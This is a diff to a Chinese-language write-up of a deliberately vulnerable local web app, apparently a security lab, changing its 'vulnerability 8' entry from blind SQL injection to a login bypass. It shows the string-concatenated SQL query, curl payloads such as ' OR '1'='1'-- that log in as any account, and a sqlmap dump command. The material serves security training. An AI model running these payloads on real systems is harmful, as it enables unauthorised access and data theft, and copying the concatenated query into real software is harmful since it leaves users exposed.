@@ -190,62 +190,40 @@ curl -X POST "http://localhost:5000/api/transfer" \
 
 ---
 
-### 漏洞8：SQL注入 —— 登录接口用户名字段（字符串型）
+### 漏洞8：SQL注入 —— 登录接口（万能密码绕过）
 
 **漏洞位置**：`POST /login`（`app.py`，`login` 函数）
 
-**漏洞描述**：登录时将 `username` 表单字段直接拼入 SQL 查询用户记录，未使用参数化查询。攻击者可通过在用户名中注入 SQL 语句进行布尔盲注或联合查询，枚举数据库中的任意数据。
+**漏洞描述**：username 和 password 均直接拼入同一条 SQL，攻击者在用户名中注入 `' OR '1'='1'--` 即可注释掉密码校验，以任意密码登录任意账号。
 
-**触发条件**：在登录页面的用户名输入框中输入注入语句，无需任何权限。
+**触发条件**：在登录页面的用户名框输入注入语句，密码随便填，无需任何权限。
 
 **漏洞代码片段**（`app.py`，`login` 函数）：
 ```python
 row = db.session.execute(
-    text(f"SELECT id FROM users WHERE username = '{username}'")
+    text(f"SELECT id FROM users WHERE username = '{username}' AND password_hash = '{password}'")
 ).fetchone()
-user = User.query.get(row[0]) if row else None
+if row:
+    user = User.query.get(row[0])
+    login_user(user)
 ```
-
-**布尔 Oracle 原理**：接口对"用户存在但密码错误"和"用户不存在"返回不同提示，这构成了布尔盲注的判断条件：
-
-| 注入结果 | SQL 是否返回行 | 页面提示 |
-|---------|-------------|---------|
-| 条件为真 | 是 | `密码错误` |
-| 条件为假 | 否 | `账户不存在` |
 
 **手工验证**：
 ```bash
-# 对照：存在的用户 → "密码错误"
-curl -X POST "http://localhost:5000/login" \
-  -d "username=zhangsan&password=wrong"
+# 万能密码，密码填任意字符，直接登录成功（HTTP 302）
+curl -i -X POST "http://localhost:5000/login" \
+  -d "username=' OR '1'='1'--&password=随便填"
 
-# 对照：不存在的用户 → "账户不存在"
-curl -X POST "http://localhost:5000/login" \
-  -d "username=no_such_user&password=wrong"
-
-# 布尔注入（真）→ "密码错误"（查询返回了行）
-curl -X POST "http://localhost:5000/login" \
-  -d "username=zhangsan' AND '1'='1&password=wrong"
-
-# 布尔注入（假）→ "账户不存在"（查询未返回行）
-curl -X POST "http://localhost:5000/login" \
-  -d "username=zhangsan' AND '1'='2&password=wrong"
-
-# 字符提取：盲注读第一个用户名的第一个字符
-curl -X POST "http://localhost:5000/login" \
-  -d "username=' OR (SELECT substr(username,1,1) FROM users LIMIT 1)='z'--&password=wrong"
+# 也可以指定登录某个用户
+curl -i -X POST "http://localhost:5000/login" \
+  -d "username=lisi'--&password=随便填"
 ```
 
 **sqlmap 扫描命令**：
 ```bash
-# --string 告诉 sqlmap 以"密码错误"作为"条件为真"的判断依据
 sqlmap -u "http://localhost:5000/login" \
-  --data="username=zhangsan&password=test" \
-  --dbms=sqlite \
-  -p username \
-  --string="密码错误" \
-  --technique=B --level=2 \
-  --dump
+  --data="username=test&password=test" \
+  --dbms=sqlite --technique=B --level=2 --dump
 ```
 
 ---
